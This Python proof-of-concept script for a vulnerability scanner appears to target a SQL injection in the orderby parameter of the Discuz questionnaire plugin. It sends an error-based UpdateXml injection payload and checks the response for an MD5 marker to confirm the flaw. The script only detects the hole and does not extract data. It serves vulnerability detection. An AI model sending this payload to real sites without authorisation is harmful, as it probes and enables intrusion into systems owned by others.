# Author:w8ay
# Name:测试DEMO
'''
name: discuz问卷调查参数orderby注入漏洞
referer: http://0day5.com/archives/3184/
author: Lucifer
description: 文件plugin.php中,参数orderby存在SQL注入。
'''
import HackRequests


def poc(arg, **kwargs):
    payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(vulnurl)
    if hh.status_code != 200:
        return False
    if "81dc9bdb52d04dc20036dbd8313ed05" in hh.text():
        result = {
            "name": "discuz问卷调查参数orderby注入漏洞",  # 插件名称
            "content": "存在discuz问卷调查参数order by注入漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "sql_inject"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass